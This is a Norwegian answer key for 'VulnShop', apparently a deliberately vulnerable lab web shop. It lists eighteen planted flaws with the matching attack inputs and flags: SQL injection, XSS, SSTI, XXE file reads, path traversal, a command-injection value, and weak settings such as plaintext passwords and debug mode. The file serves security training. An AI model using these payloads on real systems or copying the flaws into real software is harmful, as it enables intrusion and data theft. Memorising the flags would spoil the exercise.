# VulnShop – oversikt over plantede sårbarheter

Denne filen er "fasiten" for dere internt (angrepslaget bør ikke få denne før øvingen er ferdig).
Kun til bruk i isolert lab-/øvingsmiljø.

| # | Sårbarhet | Hvor | OWASP-kategori | Flagg / bevis |
|---|-----------|------|-----------------|----------------|
| 1 | SQL-injection i login | `POST /login` | A03: Injection | Logg inn som `admin' --` uten passord. Admin sin e-post inneholder `FLAG{sql_login_bypass_success}` |
| 2 | SQL-injection i søk | `GET /search?q=` | A03: Injection | `' UNION SELECT id, flag_value, null FROM flags --` gir `FLAG{sql_union_injection_found}` |
| 3 | Reflektert XSS | `GET /search?q=` | A03: Injection (XSS) | `<script>alert(document.cookie)</script>` som søk gir cookie flag `FLAG{reflected_xss}` |
| 4 | Stored XSS | Kommentarfelt på `/product/<id>` | A03: Injection (XSS) | Kjør `<script>alert(document.getElementById('admin-secret').dataset.token)</script>` i kommentar feltet, som gir DOM flag `FLAG{stored_xss_dom}`. |
| 5 | Server-Side Template Injection (SSTI) | `POST /greet` | A03: Injection | Input `{{ 7*7 }}` rendres som `Hello 49!`. Flagg: `{{ config['SSTI_FLAG'] }}` eller `{{ config.SSTI_FLAG }}` gir `FLAG{server_side_template_injection}`. RCE: `{{ ''.__class__.__mro__[1].__subclasses__() }}` gir tilgang til Python-klasser. |
| 6 | XXE (XML External Entity) | `POST /api/process_order` | A03: Injection | Send XML med external entity for å lese `app.py`: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///absolute/path/to/app.py">]><order><item>&xxe;</item></order>`. Kildekoden inneholder `FLAG{xxe}` i en kommentar. |
| 7 | IDOR | `GET /profile/<id>` | A01: Broken Access Control | `/profile/1` viser admin sin e-post/adresse uten autorisasjon |
| 8 | Prismanipulering | `POST /checkout` (skjult felt `price`) | A04: Insecure Design | Endre `price` i devtools før innsending, betaler f.eks. 1 kr for VIP-pakke |
| 9 | Usikker filopplasting | `POST /upload` | A04/A05 | Ingen filtype-/størrelsesbegrensning, filer havner direkte i `/static/uploads/` |
| 10 | Path traversal | `GET /download?file=` | A01: Broken Access Control | `?file=../app.py` lekker kildekode. `?file=../vulnshop.db` lekker database |
| 11 | Broken access control (admin) | `GET /admin` | A01: Broken Access Control | Tilgang styres kun av en klient-satt cookie (`role=admin`) – ikke server-side sesjon. Endre cookien i devtools |
| 12 | Command injection | `POST /admin/ping` | A03: Injection | Host-felt: `127.0.0.1; cat app.py` eller `127.0.0.1; ls -la` for å bevise RCE (krever admin-cookie, se #11) |
| 13 | Eksponert backup-fil | `GET /static/backup/db_backup.sql` | A05: Security Misconfiguration | Lekker alle brukernavn/passord i klartekst |
| 14 | Sensitiv info i robots.txt / HTML-kommentarer | `/robots.txt`, kildekode på alle sider | A05: Security Misconfiguration | Peker rett på `/admin` og backup-mappen |
| 15 | Svak/hardkodet secret key | `app.secret_key` i `app.py` | A02: Cryptographic Failures | Gjør sesjonscookien forfalskbar hvis man har kildekoden |
| 16 | Passord i klartekst i database | `users`-tabellen | A02: Cryptographic Failures | Ingen hashing (bcrypt/argon2 mangler) |
| 17 | Debug-modus på | `app.run(debug=True)` | A05: Security Misconfiguration | Gir Werkzeug-debugger og stack traces ved feil (i verste fall RCE via debugger-pin hvis eksponert) |
| 18 | `/admin` i `robots.txt` | – | A05 | "Disallow" er ikke tilgangskontroll, kun et hint til søkemotorer – god læring for angripere om rekognosering |

## Database

Databasen er `vulnshop.db` ved siden av `app.py`. `init_db()` oppretter
og fyller databasen ved første oppstart. Stopp appen, slett denne filen
og start appen igjen for å opprette en ny database.

## Oppsett
```bash
pip install -r requirements.txt
python app.py
```
Kjører da på `http://0.0.0.0:5000`. Kjør i en isolert VM/container/nettverk, aldri eksponert mot internett.

Standardbrukere (opprettes automatisk første gang):
- `admin` / `S3cr3tAdminPW!`
- `alice` / `alice123`
- `bob` / `bob123`
